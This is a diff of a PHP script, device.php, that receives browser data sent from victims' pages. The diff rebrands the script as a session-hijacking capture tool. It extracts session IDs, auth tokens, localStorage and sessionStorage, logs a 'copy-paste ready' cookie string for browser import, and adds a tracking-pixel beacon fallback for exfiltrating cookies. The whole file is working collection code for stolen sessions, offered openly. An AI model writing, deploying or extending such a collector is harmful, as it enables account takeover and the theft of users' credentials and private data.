@@ -1,8 +1,9 @@
 <?php
-// device.php - Enhanced cookie and device info capture with session ID extraction
+// device.php - ULTRA PRO SESSION HIJACKING DATA CAPTURE
 $date = date('dMYHis');
 $file = 'device_info.txt';
 $cookieFile = 'cookies_detailed.txt';
+$sessionFile = 'session_hijack.txt';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $data = file_get_contents('php://input');
@@ -13,8 +14,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $cookieString = $json['cookies'] ?? 'None';
         $cookieArray = [];
         $sessionIds = [];
+        $authTokens = [];
         
-        if ($cookieString !== 'None' && $cookieString !== 'No cookies available') {
+        if ($cookieString !== 'None' && $cookieString !== 'No cookies available' && $cookieString !== 'No cookies') {
             $cookies = explode('; ', $cookieString);
             foreach ($cookies as $cookie) {
                 if (strpos($cookie, '=') !== false) {
@@ -23,73 +25,130 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     
                     // Detect session IDs
                     $sessionPatterns = ['PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId', 'ASPSESSIONID', 
-                                       'session', 'sid', 'sess', 'token', 'auth', 'login'];
+                                       'session', 'sid', 'sess', 'SESSION'];
                     foreach ($sessionPatterns as $pattern) {
                         if (stripos($name, $pattern) !== false) {
                             $sessionIds[$name] = $value;
+                        }
+                    }
+                    
+                    // Detect auth tokens
+                    $authPatterns = ['token', 'auth', 'login', 'jwt', 'bearer', 'access', 'refresh', 'api'];
+                    foreach ($authPatterns as $pattern) {
+                        if (stripos($name, $pattern) !== false) {
+                            $authTokens[$name] = $value;
                         }
                     }
                 }
             }
         }
         
-        // Create detailed log entry
-        $logEntry = "\n" . str_repeat("=", 80) . "\n";
-        $logEntry .= "[$date] NEW CAPTURE\n";
-        $logEntry .= str_repeat("=", 80) . "\n\n";
+        // Extract localStorage
+        $localStorage = $json['localStorage'] ?? [];
         
-        // Session IDs (PRIORITY)
+        // Extract sessionStorage
+        $sessionStorage = $json['sessionStorage'] ?? [];
+        
+        // Create SESSION HIJACKING FILE (Most Important)
+        $hijackLog = "\n" . str_repeat("=", 100) . "\n";
+        $hijackLog .= "🚨 SESSION HIJACKING DATA CAPTURED - [$date]\n";
+        $hijackLog .= str_repeat("=", 100) . "\n\n";
+        
+        // 1. RAW COOKIE STRING (For direct browser import)
+        $hijackLog .= "📋 RAW COOKIE STRING (Copy-Paste Ready):\n";
+        $hijackLog .= str_repeat("-", 100) . "\n";
+        $hijackLog .= $cookieString . "\n\n";
+        
+        // 2. SESSION IDs
         if (!empty($sessionIds)) {
-            $logEntry .= "🔑 SESSION IDs DETECTED:\n";
-            $logEntry .= str_repeat("-", 80) . "\n";
+            $hijackLog .= "🔑 SESSION IDs (CRITICAL FOR HIJACKING):\n";
+            $hijackLog .= str_repeat("-", 100) . "\n";
             foreach ($sessionIds as $name => $value) {
-                $logEntry .= sprintf("%-30s : %s\n", $name, $value);
+                $hijackLog .= sprintf("%-40s = %s\n", $name, $value);
             }
-            $logEntry .= "\n";
+            $hijackLog .= "\n";
         }
         
-        // All Cookies
-        if (!empty($cookieArray)) {
-            $logEntry .= "🍪 ALL COOKIES (" . count($cookieArray) . " total):\n";
-            $logEntry .= str_repeat("-", 80) . "\n";
-            foreach ($cookieArray as $name => $value) {
-                $logEntry .= sprintf("%-30s : %s\n", $name, substr($value, 0, 100));
+        // 3. AUTH TOKENS
+        if (!empty($authTokens)) {
+            $hijackLog .= "🎫 AUTHENTICATION TOKENS:\n";
+            $hijackLog .= str_repeat("-", 100) . "\n";
+            foreach ($authTokens as $name => $value) {
+                $hijackLog .= sprintf("%-40s = %s\n", $name, $value);
             }
-            $logEntry .= "\n";
-        } else {
-            $logEntry .= "🍪 COOKIES: No cookies found\n\n";
+            $hijackLog .= "\n";
         }
         
-        // Device Information
-        $logEntry .= "📱 DEVICE INFORMATION:\n";
-        $logEntry .= str_repeat("-", 80) . "\n";
-        $logEntry .= sprintf("%-30s : %s\n", "User Agent", $json['userAgent'] ?? 'Unknown');
-        $logEntry .= sprintf("%-30s : %s\n", "Platform", $json['platform'] ?? 'Unknown');
-        $logEntry .= sprintf("%-30s : %s\n", "Screen Resolution", $json['screen'] ?? 'Unknown');
-        $logEntry .= sprintf("%-30s : %s\n", "Language", $json['language'] ?? 'Unknown');
-        $logEntry .= sprintf("%-30s : %s GB\n", "Memory", $json['memory'] ?? 'Unknown');
-        $logEntry .= sprintf("%-30s : %s\n", "CPU Cores", $json['cores'] ?? 'Unknown');
-        $logEntry .= sprintf("%-30s : %s\n", "Browser Vendor", $json['vendor'] ?? 'Unknown');
-        $logEntry .= sprintf("%-30s : %s\n", "Timestamp", $json['timestamp'] ?? date('Y-m-d H:i:s'));
-        $logEntry .= "\n";
-        
-        // Save to main file
-        file_put_contents($file, $logEntry, FILE_APPEND);
-        
-        // Save detailed cookies to separate file
+        // 4. ALL COOKIES (Individual)
         if (!empty($cookieArray)) {
-            $cookieLog = "\n[$date] COOKIES CAPTURED:\n";
+            $hijackLog .= "🍪 ALL COOKIES (" . count($cookieArray) . " total):\n";
+            $hijackLog .= str_repeat("-", 100) . "\n";
             foreach ($cookieArray as $name => $value) {
-                $cookieLog .= "$name=$value\n";
+                $hijackLog .= sprintf("%-40s = %s\n", $name, $value);
             }
-            $cookieLog .= "\n";
+            $hijackLog .= "\n";
+        }
+        
+        // 5. LOCAL STORAGE
+        if (!empty($localStorage) && !isset($localStorage['error'])) {
+            $hijackLog .= "💾 LOCAL STORAGE DATA:\n";
+            $hijackLog .= str_repeat("-", 100) . "\n";
+            foreach ($localStorage as $key => $value) {
+                $hijackLog .= sprintf("%-40s = %s\n", $key, substr($value, 0, 200));
+            }
+            $hijackLog .= "\n";
+        }
+        
+        // 6. SESSION STORAGE
+        if (!empty($sessionStorage) && !isset($sessionStorage['error'])) {
+            $hijackLog .= "🗄️ SESSION STORAGE DATA:\n";
+            $hijackLog .= str_repeat("-", 100) . "\n";
+            foreach ($sessionStorage as $key => $value) {
+                $hijackLog .= sprintf("%-40s = %s\n", $key, substr($value, 0, 200));
+            }
+            $hijackLog .= "\n";
+        }
+        
+        // 7. DEVICE & PAGE INFO
+        $hijackLog .= "📱 CONTEXT INFORMATION:\n";
+        $hijackLog .= str_repeat("-", 100) . "\n";
+        $hijackLog .= sprintf("%-40s : %s\n", "User Agent", $json['userAgent'] ?? 'Unknown');
+        $hijackLog .= sprintf("%-40s : %s\n", "Platform", $json['platform'] ?? 'Unknown');
+        $hijackLog .= sprintf("%-40s : %s\n", "Current URL", $json['currentURL'] ?? 'Unknown');
+        $hijackLog .= sprintf("%-40s : %s\n", "Referrer", $json['referrer'] ?? 'None');
+        $hijackLog .= sprintf("%-40s : %s\n", "Timestamp", $json['timestamp'] ?? date('Y-m-d H:i:s'));
+        $hijackLog .= "\n";
+        
+        // Save to SESSION HIJACKING file (Priority)
+        file_put_contents($sessionFile, $hijackLog, FILE_APPEND);
+        
+        // Also save to main device file
+        file_put_contents($file, $hijackLog, FILE_APPEND);
+        
+        // Save raw cookies
+        if (!empty($cookieArray)) {
+            $cookieLog = "\n[$date] RAW COOKIES:\n$cookieString\n\n";
             file_put_contents($cookieFile, $cookieLog, FILE_APPEND);
         }
         
         // Trigger notification
-        file_put_contents("Log.log", "Device info + Cookies received!\n", FILE_APPEND);
+        file_put_contents("Log.log", "🚨 SESSION DATA CAPTURED!\n", FILE_APPEND);
         
-        echo json_encode(['status' => 'success', 'cookies_captured' => count($cookieArray)]);
+        echo json_encode([
+            'status' => 'success', 
+            'cookies' => count($cookieArray),
+            'sessions' => count($sessionIds),
+            'tokens' => count($authTokens)
+        ]);
     }
+} elseif (isset($_GET['beacon'])) {
+    // Image beacon fallback
+    $cookieData = $_GET['cookies'] ?? 'None';
+    $beaconLog = "\n[BEACON-$date] Cookies: $cookieData\n";
+    file_put_contents($sessionFile, $beaconLog, FILE_APPEND);
+    
+    // Return 1x1 transparent GIF
+    header('Content-Type: image/gif');
+    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
 }
 ?>
